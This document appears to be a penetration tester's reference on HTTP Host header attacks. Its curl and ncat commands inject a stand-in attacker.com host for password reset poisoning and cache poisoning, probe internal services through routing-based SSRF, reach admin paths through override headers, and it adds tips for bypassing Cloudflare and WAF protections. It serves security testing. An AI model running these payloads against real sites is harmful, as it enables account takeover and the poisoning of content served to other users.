# Host Header Attacks Reference

## 1. Overview

HTTP Host header attacks exploit applications that implicitly trust the Host header value for URL generation, routing, or cache keying. These vulnerabilities enable password reset poisoning, web cache poisoning, SSRF, and authentication bypass — particularly dangerous behind reverse proxies (GCP GLB, Cloudflare, Istio/Envoy) that may strip or normalize headers inconsistently.

## 2. When to Test

- Application generates links using Host header (password reset, email verification, OAuth redirects)
- Multiple virtual hosts served from same IP / load balancer
- Backend accessible through reverse proxy (Envoy sidecar, GCP GLB)
- Cache layer present (Cloudflare, Varnish, CDN) that keys on Host
- Application uses Host for internal service routing (Istio mesh)
- Absolute URLs constructed server-side for redirects or canonical tags

## 3. Techniques

### Password Reset Poisoning

```bash
curl -s -X POST https://target.com/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# Reset link sent to victim contains attacker.com domain
```

### Cache Poisoning via Host

```bash
curl -s https://target.com/ \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -o /dev/null -D -
# If cached, subsequent users get poisoned response with attacker.com resources
```

### Routing-Based SSRF (Host → Internal Service)

```bash
curl -s https://target.com/api/endpoint \
  -H "Host: internal-admin.default.svc.cluster.local" \
  --resolve target.com:443:TARGET_IP
# Envoy/Istio routes to internal service based on Host header
```

### SSRF via Absolute URL

```bash
curl -s --request-target "https://internal-service/" \
  https://target.com/ \
  -H "Host: internal-service"
# Proxy forwards to absolute URL target, bypassing Host validation
```

### Connection State Attacks (HTTP/1.1 Keep-Alive)

```bash
printf "GET / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal-admin\r\n\r\n" | \
  ncat --ssl target.com 443
# Second request on reused connection may route differently
```

## 4. Headers to Test

### Host (duplicate)
```bash
curl -s https://target.com/ -H "Host: attacker.com" -H "Host: target.com"
```

### X-Forwarded-Host
```bash
curl -s https://target.com/ -H "X-Forwarded-Host: attacker.com"
```

### X-Host
```bash
curl -s https://target.com/ -H "X-Host: attacker.com"
```

### X-Forwarded-Server
```bash
curl -s https://target.com/ -H "X-Forwarded-Server: attacker.com"
```

### X-HTTP-Host-Override
```bash
curl -s https://target.com/ -H "X-HTTP-Host-Override: attacker.com"
```

### Forwarded
```bash
curl -s https://target.com/ -H "Forwarded: host=attacker.com"
```

### X-Original-URL
```bash
curl -s https://target.com/ -H "X-Original-URL: /admin/delete-user?id=1"
```

### X-Rewrite-URL
```bash
curl -s https://target.com/ -H "X-Rewrite-URL: /admin"
```

## 5. Bypass Techniques

### Duplicate Host Header
```bash
curl -s https://target.com/ -H "Host: target.com" -H "Host: attacker.com"
# Some parsers take first, others take last
```

### @-Syntax in Host
```bash
curl -s https://target.com/ -H "Host: target.com@attacker.com"
# URL parser may treat attacker.com as actual host
```

### Port Injection
```bash
curl -s https://target.com/ -H "Host: target.com:@attacker.com"
# Or: Host: target.com:80@attacker.com / Host: target.com:.attacker.com
```

### Numeric IP / Hex Encoding
```bash
curl -s https://target.com/ -H "Host: 0x7f000001"
# Bypass allowlists; also try: 127.1, 2130706433, [::1]
```

### Line Wrapping (Header Folding)
```bash
printf "GET / HTTP/1.1\r\nHost: target.com\r\n attacker.com\r\n\r\n" | \
  ncat --ssl target.com 443
# Obsolete line folding — some parsers concatenate, others take first line
```

## 6. Detection Methodology

1. **Baseline**: Send normal request, record response body, headers, status code, and any URLs/links in response
2. **Inject**: Replace Host with Burp Collaborator domain; monitor for DNS/HTTP callbacks and diff response for injected domain in links, redirects, meta tags
3. **Vary headers**: Cycle through all headers in §4; compare responses to baseline — look for reflection in `Location`, `Set-Cookie`, `<link>`, `<script src>`, `<a href>`
4. **Cache probe**: Repeat injection with cache-buster removed; request same URL from clean browser/session to confirm poisoned cache serves attacker-controlled content

## 7. Tools

### Burp Collaborator
- Inject `Host: COLLAB_ID.oastify.com` → detect out-of-band DNS/HTTP interactions
- Proves blind host header injection even without response reflection

### Param Miner (Burp Extension)
- "Guess headers" mode auto-discovers which override headers the backend respects
- Identifies unkeyed headers for cache poisoning (X-Forwarded-Host, etc.)

### ffuf — Virtual Host Discovery
```bash
ffuf -u https://TARGET_IP/ -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0 -mc all -fc 400
```
- Discovers hidden vhosts behind same IP / load balancer
- Filter by response size (`-fs`) to eliminate default responses

## 8. Pitfalls

- **GCP GLB strips non-standard headers**: `X-Forwarded-Host` may be overwritten by GLB before reaching backend — test with lesser-known headers (`X-Host`, `X-HTTP-Host-Override`)
- **Cloudflare normalizes Host**: CF rejects requests where Host doesn't match the zone — bypass by targeting origin IP directly or using CF-Connecting-IP manipulation
- **Istio/Envoy strict host matching**: VirtualService routes match on exact Host — injection only works if wildcard routes (`*`) exist or if you target the mesh sidecar directly
- **Cache key includes Host by default**: Cloudflare keys on Host+Path — cache poisoning requires finding an *unkeyed* header that influences response (X-Forwarded-Host, not Host itself)
- **WAF false negatives**: Testing from same region/IP as legitimate traffic avoids rate limits but may miss geo-based WAF rules that block external Host values

## 9. Checklist

- [ ] 1. Map all endpoints that generate URLs (reset, verify, OAuth, canonical, redirects)
- [ ] 2. Test Host header reflection in response body and headers
- [ ] 3. Inject Collaborator domain in Host — check for OOB callbacks
- [ ] 4. Fuzz all override headers (§4) against each URL-generating endpoint
- [ ] 5. Attempt duplicate Host headers (first wins vs last wins)
- [ ] 6. Test bypass techniques: @-syntax, port injection, numeric IP, line folding
- [ ] 7. Probe for routing-based SSRF using internal service names in Host
- [ ] 8. Check cache poisoning: inject unkeyed header, verify poisoned response served to others
- [ ] 9. Test connection state attacks via HTTP/1.1 keep-alive with mismatched Host
- [ ] 10. Validate findings against proxy stack (GCP GLB / Cloudflare / Envoy) — confirm header reaches backend
